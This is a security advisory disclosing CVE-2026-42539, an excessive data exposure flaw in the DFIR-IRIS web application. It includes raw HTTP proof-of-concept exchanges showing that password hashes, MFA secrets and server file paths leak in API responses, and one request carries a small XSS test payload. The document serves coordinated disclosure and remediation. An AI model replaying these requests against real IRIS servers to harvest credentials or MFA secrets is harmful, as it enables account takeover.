# DFIR-IRIS Excessive Data Exposure #

## Vulnerability Overview ##

The IRIS web application returns sensitive data to the user which are not
required for the client’s operation.

* **Identifier**            : SBA-ADV-20260126-04
* **Type of Vulnerability** : Excessive Data Exposure
* **Software/Product Name** : [IRIS](https://www.dfir-iris.org/)
* **Vendor**                : [DFIR-IRIS](https://github.com/dfir-iris)
* **Affected Versions**     : <= 2.4.27
* **Fixed in Version**      : v2.4.28
* **CVE ID**                : CVE-2026-42539
* **CVSS Vector**           : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
* **CVSS Base Score**       : 6.5 (Medium)

## Vendor Description ##

> IRIS is a collaborative digital platform designed for incident response
> analysts to share complex investigations at a technical level. It can be
> installed on a dedicated server or as a portable application for roaming
> investigations where internet access might not be available.

Source: <https://docs.dfir-iris.org/2.4.24/>

## Impact ##

The following data points are returned by the application without necessity:

* Password hashes
* *Multi-Factor Authentication (MFA)* secrets
* Local storage paths on the server

## Vulnerability Description ##

When accessing certain objects from the API, the response contains more
fields than necessary for the application. Among these additional fields,
there are sensitive ones that might be misused by an attacker. This might
severely increase the impact of other vulnerabilities, such as access control
issues.

## Proof of Concept ##

### User Details ###

If an administrator updates information about an account, several sensitive
data which is not required for the application’s operations are returned by
the server:

* The hash of the user’s password
* The *Multi-Factor Authentication (MFA)* secret configured for the user

```http
POST /manage/users/update/2?cid=1 HTTP/1.1
Host: myiris.local
Cookie: session=.eJwt[...]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 233
Origin: https://myiris.local
Referer: https://myiris.local/manage/access-control?cid=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"csrf_token":"IjgyNDllMDhhZjJhMWYwZmVkMmFkYTdjNzU0ODZlNDM1Y2JlZGY1YTYi.aWTS9Q.NpxZMD7Mi_3VtCQ8TTjBDG9mvvo","user_name":"Pen Tester I","user_login":"pt1","user_email":"pt1@sba.zone","uuid":   "00000000-0000-48a3-bf5e-88455ce6c207"
}

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 26 Jan 2026 11:02:00 GMT
Content-Type: application/json
Content-Length: 524
Connection: keep-alive
Vary: Cookie
Content-Security-Policy: default-src 'self' https://analytics.dfir-iris.org; script-src 'self' 'unsafe-inline' https://analytics.dfir-iris.org; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000: includeSubDomains
Front-End-Https: on

{"status": "success", "message": "User updated", "data": {"user_name": "Pen Tester I", "user_login": "pt1", "user_email": "pt1@sba.zone", "user_password": "$2b$12$bYeULWZhSC/yg62cO/0tUuB9RjA2UACEWTI6EbPe/HXH2IiIS/aOm", "user_id": 2, "user_is_service_account": false, "id": 2, "uuid": "00000000-0000-48a3-bf5e-88455ce6c207", "active": true, "external_id": null, "in_dark_mode": true, "has_mini_sidebar": false, "has_deletion_confirmation": false, "mfa_secrets": 3VJMGO3K7JYRV5SQUJ2N33UQ5IY4UHVD, "webauthn_credentials": [], "mfa_setup_complete": true}}
```

The same information is returned if a user changes their own password:

```http
POST /user/update?cid=1 HTTP/1.1
Host: myiris.local
Cookie: session=.eJwt[...]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 139
Origin: https://myiris.local
Referer: https://myiris.local/user/settings?cid=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: cyan
Priority: u=0
Te: trailers
Connection: keep-alive

{"csrf_token":"ImU0OTZmMjYyYzBjOTg0MmFhMmM1OTQ5YmRiMzZiODdlM2Q0N2JjMDci.aWe5GA.cEJbHuA4NiOkRPLF3NMw3pzyVU4","user_password":"Password123."}

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 26 Jan 2026 15:41:43 GMT
Content-Type: application/json
Content-Length: 588
Connection: keep-alive
Vary: Cookie
Content-Security-Policy: default-src 'self' https://analytics.dfir-iris.org; script-src 'self' 'unsafe-inline' https://analytics.dfir-iris.org; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000: includeSubDomains
Front-End-Https: on

{"status": "success", "message": "User updated", "data": {"user_name": "Pen Tester I", "user_login": "pt1", "user_email": "pt1@sba.zone", "user_password": "$2b$12$JlEi/KilzrYHP42PDte83.vL/soWPs3ktooy/eYbTCQ2iNM6H580K", "user_id": 2, "user_primary_organisation_id": 1, "user_is_service_account": false, "id": 2, "uuid": "00000000-0000-48a3-bf5e-88455ce6c207", "active": true, "external_id": null, "in_dark_mode": true, "has_mini_sidebar": false, "has_deletion_confirmation": false, "mfa_secrets": "3VJMGO3K7JYRV5SQUJ2N33UQ5IY4UHVD", "webauthn_credentials": [], "mfa_setup_complete": true}}
```

### Datastore ###

If a file gets uploaded to the *Datastore*, the full path where it is stored
on the server gets sent to the client. This information can help to
facilitate an attack and is never used by the client.

```http
POST /datastore/file/update/1?cid=1 HTTP/1.1
Host: myiris.local
Cookie: session=.eJwt[...]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundaryd21c3536d53c9c4ccda05f864fdff09a
Content-Length: 886
Origin: https://myiris.local
Referer: https://myiris.local/case?cid=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

------geckoformboundaryd21c3536d53c9c4ccda05f864fdff09a
Content-Disposition: form-data; name="csrf_token"

ImRmMTMzZTczYzAwZDRjMDk5ZjhiZWQ3MDViYTk0YmE4MDdiZDZjOTAi.aWjqnQ.TSlFufL8ddu9Yv4p6rgbo1dWn90
------geckoformboundaryd21c3536d53c9c4ccda05f864fdff09a
Content-Disposition: form-data; name="file_original_name"

xss.svg
------geckoformboundaryd21c3536d53c9c4ccda05f864fdff09a
Content-Disposition: form-data; name="file_description"

<script>alert(19)</script>
------geckoformboundaryd21c3536d53c9c4ccda05f864fdff09a
Content-Disposition: form-data; name="file_tags"


------geckoformboundaryd21c3536d53c9c4ccda05f864fdff09a
Content-Disposition: form-data; name="file_is_evidence"

y
------geckoformboundaryd21c3536d53c9c4ccda05f864fdff09a
Content-Disposition: form-data; name="file_content"

undefined
------geckoformboundaryd21c3536d53c9c4ccda05f864fdff09a--

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 22 Jan 2026 13:25:08 GMT
Content-Type: application/json
Content-Length: 812
Connection: keep-alive
Vary: Cookie
Content-Security-Policy: default-src 'self' https://analytics.dfir-iris.org; script-src 'self' 'unsafe-inline' https://analytics.dfir-iris.org; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000: includeSubDomains
Front-End-Https: on

{"status": "success", "message": "File updated in datastore", "data": {"file_original_name": "xss.svg", "file_description": "<script>alert(19)</script>", "file_id": 1, "file_uuid": "c162ea6b-4133-4dc6-b648-f467e0cfa08e", "file_local_name": "/home/iris/server_data/datastore/Regulars/case-1/dsf-c162ea6b-4133-4dc6-b648-f467e0cfa08e.zip", "file_date_added": "2026-01-22T13:17:42.118517", "file_tags": "", "file_size": 379, "file_is_ioc": false, "file_is_evidence": true, "file_password": "1234", "file_parent_id": 2, "file_sha256": "206D7864487C8B35155BD20657738F38985785182FA6204392495EF5CDD2B19C", "added_by_user_id": 3, "modification_history": {"1768483062.118545": {"user": "pt2", "user_id": 3, "action": "created"}, "1768483508.544956": {"user": "pt2", "user_id": 3, "action": "updated"}}, "file_case_id": 1}}
```

## Recommended Countermeasures ##

We recommend updating to IRIS version 2.4.28 or later.

We strongly recommend taking an allowlist approach when it comes to
serializing object properties for API responses. Do not approach the
vulnerability by blocklisting sensitive and unnecessary fields, as this is
very error-prone. Sensitive fields added to entities later on might be
forgotten to put on the blocklist.

Another approach would be the usage of *Data Transfer Objects (DTOs)*. Those
are classes which only hold those attributes that are required in the context
at hand.

## Timeline ##

* `2026-01-26` Identified the vulnerability in version 2.4.26
* `2026-01-30` Initial vendor contact via e-mail
* `2026-02-27` Second vendor contact via e-mail
* `2026-03-30` Report on GitHub due to a missing response from the vendor
* `2026-04-27` Version containing fix (v2.4.28) tagged by vendor
* `2026-04-28` GitHub assigned CVE-2026-42539
* `2026-05-04` Confirm fix for v2.4.28
* `2026-05-19` Public disclosure

## References ##

* OWASP API Security Top 10. API3:2023 Broken Object Property Level
  Authorization:
  <https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/>
* Baeldung. The DTO Pattern (Data Transfer Object):
  <https://www.baeldung.com/java-dto-pattern>
* Common Weakness Enumeration. CWE-201 Insertion of Sensitive Information Into
  Sent Data: <https://cwe.mitre.org/data/definitions/201.html>

## Credits ##

* Michael Koppmann ([SBA Research](https://www.sba-research.org/))
* Mathias Tausig ([SBA Research](https://www.sba-research.org/))

The discovery of this vulnerability was made possible through support from
[CYSSDE](https://cyssde.eu/) and the European Union.

![CYSSDE](images/cyssde.png)
